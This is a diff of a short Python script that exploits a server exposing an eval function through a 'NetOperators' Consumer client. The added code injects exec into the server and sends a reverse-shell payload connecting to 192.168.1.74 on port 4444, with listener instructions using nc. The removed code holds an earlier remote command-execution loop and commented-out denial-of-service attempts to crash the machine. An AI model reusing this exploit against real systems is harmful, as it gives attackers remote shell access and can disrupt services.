@@ -1,16 +1,18 @@
 from NetOperators import Consumer
+"""
+Showing an exploit if the server enabled the eval function. This opens a reverse shell on port 4444.
+To use the reverse shell, run on a terminal: nc -lvnp 4444
+btw: on the ipad, you can use a-shell to run the reverse shell with nc -l 4444. for the ip, run ifconfig | grep 192.168
+or grep inet
+"""
+c = Consumer("test")
+c.eval("self.functions.update({'exec': exec})")
+print(c.list())
+c.functions = set(c.list())
+payload = """import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(('192.168.1.74',4444));
+subprocess.Popen([next(filter(os.path.exists,['/bin/bash','/bin/sh']),'-i')],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno());
+""".strip()
+c.exec(payload)
 
-c = Consumer()
-print(c.get("eval", x="self.methods.update({'eval': lambda x: eval(x, {'self': self}, globals()), 'exec': lambda x: exec(x, {'s': self}), 'gl': lambda: [i.__repr__() for i in globals()], 'lo': lambda: [i.__repr__() for i in locals()], 'pow': lambda b, e: b**e})"))
-# Try to crash the machine.
-# print(c.get("eval", x="self.methods.update({'f': lambda x: [i**x**301758017385753407510313 for i in range(x*100)]})"))
-# print(c.get("exec", x="from multiprocessing import Process; [Process(target=s.methods['f'], args=(i,)).start() for i in range(1, 1001)]"))
-
-# Getting shell access.
-print(c.get("exec", x="from subprocess import check_output, run; s.methods.update({'c': check_output, 'r': run})"))
-
-while True:
-    exec = input().split(" ")
-    if len(exec) == 0 or exec[0] == "exit":
-        break
-    print(c.get('r', args=exec, capture_output=True).stdout.decode())
